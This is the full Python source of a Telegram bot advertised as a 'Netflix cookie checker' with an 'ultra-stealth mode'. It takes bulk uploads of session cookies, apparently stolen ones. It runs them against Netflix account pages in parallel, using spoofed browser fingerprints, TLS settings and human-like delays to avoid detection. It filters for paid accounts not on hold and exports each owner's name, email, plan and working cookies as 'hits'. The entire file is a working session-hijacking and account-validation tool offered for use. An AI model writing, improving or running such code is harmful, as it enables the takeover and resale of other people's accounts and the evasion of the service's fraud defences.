import warnings
warnings.filterwarnings("ignore")
import urllib3
urllib3.disable_warnings()

import os
import io
import re
import json
import hashlib
import zipfile
import asyncio
import logging
import random
import time
import ssl
from collections import OrderedDict

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)
from telegram.error import NetworkError, TimedOut, RetryAfter, BadRequest

TOKEN = os.getenv("NF_BOT_TOKEN", "").strip()
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("nfbot")

if not TOKEN:
    raise SystemExit("Set NF_BOT_TOKEN env var first")

MAX_RETRIES = 2
MIN_DELAY = 0.4
MAX_DELAY = 1.8
COOLDOWN_429 = 20
LIVE_EVERY = 1
COOKIE_TIMEOUT = 35
EDIT_THROTTLE = 0.7

# ── TLS — full Chrome 126 handshake ────────────────────────────
CHROME_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:"
    "AES256-GCM-SHA384:AES128-SHA:AES256-SHA"
)


class ChromeAdapter(HTTPAdapter):
    def init_poolmanager(self, *a, **kw):
        ctx = create_urllib3_context(ciphers=CHROME_CIPHERS)
        ctx.options |= 0x4
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kw["ssl_context"] = ctx
        return super().init_poolmanager(*a, **kw)

    def cert_verify(self, conn, url, verify, cert):
        return super().cert_verify(conn, url, False, cert)


def new_session():
    s = requests.Session()
    a = ChromeAdapter(pool_connections=50, pool_maxsize=50)
    s.mount("https://", a)
    s.mount("http://", a)
    s.verify = False
    return s


# ── FINGERPRINTS — 12 full profiles ────────────────────────────
PROFILES = [
    # iPhone
    {"name": "iPhone", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"', "mobile": "?1", "platform": '"iOS"'},
    {"name": "iPhone", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Safari";v="16", "Not=A?Brand";v="99"', "mobile": "?1", "platform": '"iOS"'},
    {"name": "iPhone", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Safari";v="15", "Not=A?Brand";v="99"', "mobile": "?1", "platform": '"iOS"'},
    {"name": "iPhone", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"', "mobile": "?1", "platform": '"iOS"'},
    # iPad
    {"name": "iPad", "ua": "Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"', "mobile": "?1", "platform": '"iPadOS"'},
    {"name": "iPad", "ua": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
     "ch-ua": '"Safari";v="16", "Not=A?Brand";v="99"', "mobile": "?1", "platform": '"iPadOS"'},
    # Mac
    {"name": "Mac", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"', "mobile": "?0", "platform": '"macOS"'},
    {"name": "Mac", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
     "ch-ua": '"Safari";v="17", "Not=A?Brand";v="99"', "mobile": "?0", "platform": '"macOS"'},
    # Windows
    {"name": "Windows", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"', "mobile": "?0", "platform": '"Windows"'},
    {"name": "Windows", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.2592.87",
     "ch-ua": '"Microsoft Edge";v="126", "Chromium";v="126", "Not-A.Brand";v="99"', "mobile": "?0", "platform": '"Windows"'},
    # Android
    {"name": "Android", "ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36",
     "ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"', "mobile": "?1", "platform": '"Android"'},
    {"name": "Android", "ua": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
     "ch-ua": '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"', "mobile": "?1", "platform": '"Android"'},
]

ACCEPT_LANGS = [
    "ar-SA,ar;q=0.9,en;q=0.8", "ar-AE,ar;q=0.9,en;q=0.8",
    "ar-EG,ar;q=0.9,en;q=0.8", "ar-JO,ar;q=0.9,en;q=0.8",
    "en-US,en;q=0.9", "en-GB,en;q=0.9",
]


def pick_profile():
    return random.choice(PROFILES)


def build_headers(p, referer=None):
    h = OrderedDict()
    h["Host"] = "www.netflix.com"
    h["User-Agent"] = p["ua"]
    h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    h["Accept-Language"] = random.choice(ACCEPT_LANGS)
    h["Accept-Encoding"] = "gzip, deflate, br"
    h["sec-ch-ua"] = p["ch-ua"]
    h["sec-ch-ua-mobile"] = p["mobile"]
    h["sec-ch-ua-platform"] = p["platform"]
    h["Upgrade-Insecure-Requests"] = "1"
    h["Sec-Fetch-Dest"] = "document"
    h["Sec-Fetch-Mode"] = "navigate"
    h["Sec-Fetch-Site"] = "same-origin" if referer else "none"
    h["Sec-Fetch-User"] = "?1"
    h["Cache-Control"] = "max-age=0"
    h["DNT"] = "1"
    h["Connection"] = "keep-alive"
    if referer:
        h["Referer"] = referer
    return dict(h)


def human_delay(scale=1.0):
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY) * scale)


# ── COOKIE PARSING + DEDUP ─────────────────────────────────────
NF_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}
NF_ID_RE = re.compile(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', re.I)
EMAIL_RE = re.compile(r"([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})")

SESSION = {}


def sess(uid):
    if uid not in SESSION:
        SESSION[uid] = {"awaiting": None, "hits": OrderedDict(),
                        "busy": False, "pending": None}
    return SESSION[uid]


def cookie_fingerprint(cd):
    return hashlib.sha256(json.dumps(cd, sort_keys=True).encode()).hexdigest()


def dedup_cookies(cookies):
    seen, uniq, dupes = set(), [], 0
    for cs in cookies:
        fp = cookie_fingerprint(cs)
        if fp in seen:
            dupes += 1
            continue
        seen.add(fp)
        uniq.append(cs)
    return uniq, dupes


def parse_cookies(text):
    text = (text or "").strip()
    out = []
    try:
        if text.startswith(("{", "[")):
            obj = json.loads(text)
            if isinstance(obj, dict):
                flat = {k: str(v) for k, v in obj.items() if k in NF_NAMES}
                if flat.get("NetflixId"):
                    out.append(flat)
                if isinstance(obj.get("cookies"), list):
                    m = {c["name"]: c["value"] for c in obj["cookies"]
                         if isinstance(c, dict) and c.get("name") in NF_NAMES and "value" in c}
                    if m.get("NetflixId"):
                        out.append(m)
            elif isinstance(obj, list):
                m = {c["name"]: c["value"] for c in obj
                     if isinstance(c, dict) and c.get("name") in NF_NAMES and "value" in c}
                if m.get("NetflixId"):
                    out.append(m)
    except Exception:
        pass
    ns = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#") or not line:
            continue
        p = line.split("\t")
        if len(p) >= 7 and p[5] in NF_NAMES:
            ns.append({"name": p[5], "value": p[6]})
    if ns:
        nf = [e for e in ns if e["name"] == "NetflixId"]
        if nf:
            for n in nf:
                cs = {"NetflixId": n["value"]}
                cs.update({e["name"]: e["value"] for e in ns if e["name"] != "NetflixId"})
                out.append(cs)
        else:
            m = {e["name"]: e["value"] for e in ns}
            if m:
                out.append(m)
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cs = {}
        for part in re.split(r"[;\s]+", line):
            if "=" in part:
                k, v = part.split("=", 1)
                if k.strip() in NF_NAMES:
                    cs[k.strip()] = v.strip()
        if cs.get("NetflixId"):
            out.append(cs)
    for m in NF_ID_RE.finditer(text):
        out.append({"NetflixId": m.group(1).strip("\"'")})
    return dedup_cookies(out)[0]


def cookies_from_zip(data):
    out = []
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        for n in z.namelist():
            if n.endswith("/") or n.startswith(("__MACOSX", ".")):
                continue
            if not n.lower().endswith((".txt", ".json")):
                continue
            try:
                out.extend(parse_cookies(z.read(n).decode("utf-8", "ignore")))
            except Exception:
                continue
    return dedup_cookies(out)[0]


# ── CHECK ──────────────────────────────────────────────────────
def _check_worker(cd):
    if not cd.get("NetflixId"):
        return {"ok": False, "tag": "no_id", "retries": 0, "device": "?"}
    profile = pick_profile()
    s = new_session()
    s.cookies.update(cd)
    retries = 0
    for attempt in range(MAX_RETRIES + 1):
        try:
            try:
                s.get("https://www.netflix.com/",
                      headers=build_headers(profile, None),
                      timeout=(10, 20), allow_redirects=True)
                human_delay(0.6)
            except Exception:
                pass
            r = s.get("https://www.netflix.com/YourAccount",
                      headers=build_headers(profile, "https://www.netflix.com/browse"),
                      timeout=(10, 25), allow_redirects=True)
            if r.status_code in (429, 502, 503, 504):
                retries += 1
                time.sleep(COOLDOWN_429 + random.uniform(0, 10))
                continue
            if "login" in r.url.lower() or r.status_code != 200:
                return {"ok": False, "tag": "dead", "retries": retries,
                        "device": profile["name"]}
            txt = r.text

            def find(p):
                m = re.search(p, txt)
                return m.group(1) if m else None

            name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
            plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
            ctry = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
            ms = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
            hold = bool(re.search(r'"isUserOnHold"\s*:\s*true', txt))
            if not name and not plan and not ctry:
                return {"ok": False, "tag": "no_data", "retries": retries,
                        "device": profile["name"]}
            plan_l = (plan or "").lower()
            paid = ms == "CURRENT_MEMBER" and "free" not in plan_l and plan_l not in ("", "unknown")
            if email:
                email = EMAIL_RE.sub(lambda m: m.group(1) + "***" + m.group(2), email)
            tag = "paid" if (paid and not hold) else ("hold" if hold else "free")
            return {"ok": True, "paid": paid, "hold": hold,
                    "name": name or "?", "plan": plan or "?",
                    "country": ctry or "?", "email": email or "?",
                    "status": ms or "?", "cookie": cd, "retries": retries,
                    "device": profile["name"], "tag": tag}
        except requests.RequestException:
            retries += 1
            time.sleep(1.5 + random.uniform(0, 1.5))
            continue
    return {"ok": False, "tag": "err", "retries": retries, "device": "?"}


async def check_cookie_async(cd):
    try:
        return await asyncio.wait_for(asyncio.to_thread(_check_worker, cd),
                                      timeout=COOKIE_TIMEOUT)
    except asyncio.TimeoutError:
        return {"ok": False, "tag": "timeout", "retries": 0, "device": "?"}
    except Exception:
        return {"ok": False, "tag": "err", "retries": 0, "device": "?"}


# ── UI ────────────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Check Cookie", callback_data="do_check")],
        [InlineKeyboardButton("📊 Bot Info", callback_data="stats"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("💎 Premium", callback_data="premium"),
         InlineKeyboardButton("❌ Close", callback_data="close")],
    ])


def kb_back():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu")]])


def kb_workers():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚶 1 Worker", callback_data="wk_1")],
        [InlineKeyboardButton("🏃 5 Workers", callback_data="wk_5")],
        [InlineKeyboardButton("🚀 10 Workers", callback_data="wk_10")],
        [InlineKeyboardButton("⚡ 20 Workers", callback_data="wk_20")],
        [InlineKeyboardButton("⬅️ Cancel", callback_data="menu")],
    ])


def p_menu():
    return (
        "🎬 <b>NETFLIX COOKIE CHECKER v11</b> 🍪\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     💎 <b>ULTRA-STEALTH MODE</b> 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👋 <b>Welcome, boss!</b>\n\n"
        "🚀 <b>HOW TO USE:</b>\n"
        "├ 1️⃣ Tap <b>🔍 Check Cookie</b>\n"
        "├ 2️⃣ Paste cookie / NetflixId\n"
        "├ 3️⃣ Or upload <code>.txt</code> / <code>.zip</code>\n"
        "├ 4️⃣ Choose worker count\n"
        "└ 5️⃣ Get 💎 <b>paid, no-hold</b> hits\n\n"
        "⚡ <b>ANTI-DETECT STACK:</b>\n"
        "├ 🕵️ 12 device fingerprints\n"
        "├ 🔐 Chrome 126 TLS + TLS 1.3\n"
        "├ 🌍 Arab locale match\n"
        "├ 🎭 Full browser header chain\n"
        "├ 🧠 Human delay jitter\n"
        "├ 🔗 Referer chain warm-up\n"
        "├ 🍪 Cookie jar persistence\n"
        "├ 🛑 Auto-cooldown on 429\n"
        "├ 🆔 Duplicate detection\n"
        "└ 💎 Paid &amp; no-hold filter"
    )


def p_stats():
    return (
        "📊 <b>BOT INFORMATION</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎭 <b>Fingerprints:</b> 12 profiles\n"
        "   iPhone 4 · iPad 2 · Mac 2 · Win 2 · Android 2\n"
        "🔐 <b>TLS:</b> Chrome 126 + TLS 1.3\n"
        "🌍 <b>Locale:</b> ar-SA / ar-AE / ar-EG / ar-JO / en-US / en-GB\n"
        "🧠 <b>Delay:</b> 0.4–1.8s jitter\n"
        "⏱️ <b>Cookie timeout:</b> 35s\n"
        "🔁 <b>Retries:</b> 2 with cooldown\n"
        "🆔 <b>Dedup:</b> SHA256 auto\n"
        "💎 <b>Filter:</b> Paid + No-Hold only\n\n"
        "🏆 <b>Detection Risk:</b> Ultra Low"
    )


def p_settings():
    return (
        "⚙️ <b>SETTINGS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "├ ⚡ Workers: <b>1 / 5 / 10 / 20</b>\n"
        "├ 🎭 Device rotation: <b>Auto (12)</b>\n"
        "├ 🌍 Locale: <b>Auto (Arab)</b>\n"
        "├ 🔁 Retries: <b>2</b>\n"
        "├ ⏱️ Timeout: <b>35s/cookie</b>\n"
        "├ 🆔 Dedup: <b>SHA256</b>\n"
        "└ 📊 Live: <b>Every cookie</b>"
    )


def p_premium():
    return (
        "💎 <b>PREMIUM ACCESS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🌟 <b>Unlock Full Power</b>\n\n"
        "├ ⚡ Up to 20 workers\n"
        "├ 🚀 Priority speed\n"
        "├ 📊 Advanced stats\n"
        "└ 🛡 Priority support\n\n"
        "🤖 <i>Currently FREE &amp; OPEN</i>"
    )


# ── HANDLERS ──────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    sess(update.effective_user.id)["awaiting"] = None
    await update.message.reply_text(p_menu(), reply_markup=kb_main(), parse_mode="HTML")


async def cb_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; s = sess(q.from_user.id)
    s["awaiting"] = None; s["pending"] = None
    try:
        await q.edit_message_text(p_menu(), reply_markup=kb_main(), parse_mode="HTML")
    except BadRequest:
        pass
    await q.answer()


async def cb_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; s = sess(q.from_user.id)
    s["awaiting"] = "check"
    try:
        await q.edit_message_text(
            "🔍 <b>CHECK MODE ACTIVE</b>\n\n"
            "📋 Paste cookie or NetflixId\n"
            "📦 Or upload <code>.txt</code> / <code>.zip</code>\n\n"
            "🎭 Stealth ON  ·  🆔 Auto-dedup ON",
            reply_markup=kb_back(), parse_mode="HTML")
    except BadRequest:
        pass
    await q.answer()


async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.edit_message_text(p_stats(), reply_markup=kb_back(), parse_mode="HTML")
    except BadRequest:
        pass
    await q.answer()


async def cb_settings(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.edit_message_text(p_settings(), reply_markup=kb_back(), parse_mode="HTML")
    except BadRequest:
        pass
    await q.answer()


async def cb_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.edit_message_text(p_premium(), reply_markup=kb_back(), parse_mode="HTML")
    except BadRequest:
        pass
    await q.answer()


async def cb_close(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.message.delete()
    except Exception:
        pass
    await q.answer()


async def cb_worker(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id; s = sess(uid)
    n = int(q.data.split("_")[1])
    cookies = s.get("pending") or []
    if not cookies:
        await q.answer("❌ No cookies loaded.", show_alert=True)
        return
    if s.get("busy"):
        await q.answer("⚠️ Already running.", show_alert=True)
        return
    await q.answer(f"🚀 Starting with {n} worker(s)")
    s["pending"] = None; s["awaiting"] = None
    asyncio.create_task(run_check(q.message, uid, cookies, ctx, n))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        return
    raw = parse_cookies(update.message.text or "")
    uniq, dupes = dedup_cookies(raw)
    if not uniq:
        await update.message.reply_text("❌ No NetflixId found.")
        return
    await update.message.reply_text(
        f"📊 Loaded: <b>{len(uniq)}</b>\n"
        f"🆔 Duplicates removed: <b>{dupes}</b>\n\n"
        f"⚡ <b>Choose workers:</b>",
        reply_markup=kb_workers(), parse_mode="HTML")
    s["pending"] = uniq


async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; s = sess(uid)
    if s.get("awaiting") != "check" or s.get("busy"):
        await update.message.reply_text("⚠️ Tap <b>Check Cookie</b> first.",
                                        parse_mode="HTML")
        return
    doc = update.message.document
    if not doc:
        return
    name = doc.file_name.lower()
    if not name.endswith((".txt", ".zip")):
        await update.message.reply_text("❌ Only .txt or .zip.")
        return
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    raw = cookies_from_zip(bytes(data)) if name.endswith(".zip") else \
          parse_cookies(bytes(data).decode("utf-8", "ignore"))
    uniq, dupes = dedup_cookies(raw)
    if not uniq:
        await update.message.reply_text("❌ No cookies found.")
        return
    await update.message.reply_text(
        f"📊 Loaded: <b>{len(uniq)}</b>\n"
        f"🆔 Duplicates removed: <b>{dupes}</b>\n\n"
        f"⚡ <b>Choose workers:</b>",
        reply_markup=kb_workers(), parse_mode="HTML")
    s["pending"] = uniq


# ── RUNNER ────────────────────────────────────────────────────
async def run_check(msg, uid, cookies, ctx, workers):
    s = sess(uid)
    s["busy"] = True
    total = len(cookies)
    counts = {"paid": 0, "free": 0, "hold": 0, "dead": 0,
              "no_id": 0, "no_data": 0, "timeout": 0, "err": 0}
    retries_total = 0
    paid_hits = []
    device_counts = {}
    recent = []
    checked = 0
    start_t = time.time()
    last_edit = 0.0

    prog = await msg.reply_text(
        f"🚀 <b>Started</b>\n"
        f"📊 Total: <b>{total}</b>  ⚡ Workers: <b>{workers}</b>\n"
        f"⏳ Running...",
        parse_mode="HTML")

    lock = asyncio.Lock()
    sem = asyncio.Semaphore(workers)

    async def one(cd, idx):
        nonlocal checked, retries_total, last_edit
        async with sem:
            r = await check_cookie_async(cd)
        async with lock:
            checked += 1
            retries_total += r.get("retries", 0)
            tag = r.get("tag", "err")
            counts[tag] = counts.get(tag, 0) + 1
            dev = r.get("device", "?")
            device_counts[dev] = device_counts.get(dev, 0) + 1
            if tag == "paid" and r.get("ok"):
                paid_hits.append(r)
            recent.append(f"#{idx+1} {tag.upper()}")
            if len(recent) > 5:
                recent.pop(0)

            now = time.monotonic()
            if checked % LIVE_EVERY == 0 and (now - last_edit) >= EDIT_THROTTLE:
                last_edit = now
                elapsed = time.time() - start_t
                spd = checked / elapsed if elapsed > 0 else 0
                eta = (total - checked) / spd if spd > 0 else 0
                pct = int(checked * 100 / total) if total else 0
                fill = int(pct / 10)
                bar = "█" * fill + "░" * (10 - fill)
                dev_line = " | ".join(f"{k}:{v}" for k, v in list(device_counts.items())[:4])
                txt = (
                    "🔍 <b>Checking...</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>{checked}/{total}</b> ({pct}%)\n"
                    f"<code>{bar}</code>\n\n"
                    f"💎 Paid: <b>{counts['paid']}</b>  "
                    f"🆓 Free: <b>{counts['free']}</b>  "
                    f"⏸️ Hold: <b>{counts['hold']}</b>\n"
                    f"☠️ Dead: <b>{counts['dead']}</b>  "
                    f"❌ Err: <b>{counts['err'] + counts['timeout']}</b>  "
                    f"🔁 Retry: <b>{retries_total}</b>\n"
                    f"⚡ <b>{spd:.2f}/s</b>  ⏱️ <b>{elapsed:.1f}s</b>  "
                    f"⏳ ETA <b>{eta:.1f}s</b>\n\n"
                    f"🎭 {dev_line}\n"
                    f"📡 {' • '.join(recent)}"
                )
                try:
                    await prog.edit_text(txt, parse_mode="HTML")
                except (BadRequest, RetryAfter, TimedOut, NetworkError):
                    pass

    await asyncio.gather(*[one(cd, i) for i, cd in enumerate(cookies)])

    s["busy"] = False; s["awaiting"] = None
    s["hits"] = OrderedDict((f"H{i+1}", h) for i, h in enumerate(paid_hits))

    elapsed = time.time() - start_t
    spd = checked / elapsed if elapsed > 0 else 0
    dev_line = " | ".join(f"{k}:{v}" for k, v in device_counts.items())

    summary = (
        "✅ <b>COMPLETE!</b> 🎉\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>Stats</b>\n"
        f"├ 🍪 Total:     <b>{total}</b>\n"
        f"├ 🔍 Checked:   <b>{checked}</b>\n"
        f"├ 💎 Paid Hits: <b>{counts['paid']}</b>\n"
        f"├ 🆓 Free:      <b>{counts['free']}</b>\n"
        f"├ ⏸️ Hold:      <b>{counts['hold']}</b>\n"
        f"├ ☠️ Dead:      <b>{counts['dead']}</b>\n"
        f"├ ❌ Errors:    <b>{counts['err']}</b>\n"
        f"├ ⏱️ Timeouts:  <b>{counts['timeout']}</b>\n"
        f"├ 🔁 Retries:   <b>{retries_total}</b>\n"
        f"├ ⚡ Speed:     <b>{spd:.2f}/s</b>\n"
        f"├ ⏱️ Time:      <b>{elapsed:.1f}s</b>\n"
        f"└ ⚙️ Workers:   <b>{workers}</b>\n\n"
        f"🎭 <b>Devices:</b> {dev_line}\n"
    )

    if counts["paid"] > 0:
        summary += "\n🎉 <b>Paid accounts found!</b>"
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("📄 Download .txt", callback_data="dl_txt")],
            [InlineKeyboardButton("⬅️ Menu", callback_data="menu")]])
    else:
        summary += "\n😔 <b>No paid &amp; no-hold found.</b>"
        markup = kb_back()

    try:
        await prog.edit_text(summary, reply_markup=markup, parse_mode="HTML")
    except Exception:
        await msg.reply_text(summary, reply_markup=markup, parse_mode="HTML")


async def dl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    hits = sess(q.from_user.id).get("hits") or {}
    if not hits:
        await q.answer("❌ No hits.", show_alert=True)
        return
    lines = ["🍪 NETFLIX PAID HITS 🍪", "=" * 40, ""]
    for i, (_, v) in enumerate(hits.items(), 1):
        lines.append(f"🎯 HIT #{i}")
        lines.append(f"👤 Name:    {v.get('name', '?')}")
        lines.append(f"📦 Plan:    {v.get('plan', '?')}")
        lines.append(f"🌍 Country: {v.get('country', '?')}")
        lines.append(f"📧 Email:   {v.get('email', '?')}")
        lines.append(f"📊 Status:  {v.get('status', '?')}")
        lines.append(f"🎭 Device:  {v.get('device', '?')}")
        lines.append("🍪 Cookies:")
        for kk, vv in v.get("cookie", {}).items():
            lines.append(f"  {kk}={vv}")
        lines.append("")
    buf = io.BytesIO("\n".join(lines).encode())
    await ctx.bot.send_document(
        q.message.chat_id,
        document=InputFile(buf, filename="netflix_paid_hits.txt"),
        caption=f"💎 {len(hits)} paid, no-hold accounts")
    await q.answer("📄 Sent!")


async def on_error(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    log.error("handler error: %s", ctx.error)


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(dl, pattern="^dl_txt$"))
    app.add_handler(CallbackQueryHandler(cb_menu, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(cb_check, pattern="^do_check$"))
    app.add_handler(CallbackQueryHandler(cb_stats, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(cb_settings, pattern="^settings$"))
    app.add_handler(CallbackQueryHandler(cb_premium, pattern="^premium$"))
    app.add_handler(CallbackQueryHandler(cb_close, pattern="^close$"))
    app.add_handler(CallbackQueryHandler(cb_worker, pattern="^wk_(1|5|10|20)$"))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES,
                    drop_pending_updates=True,
                    poll_interval=1.0,
                    timeout=30)


if __name__ == "__main__":
    main()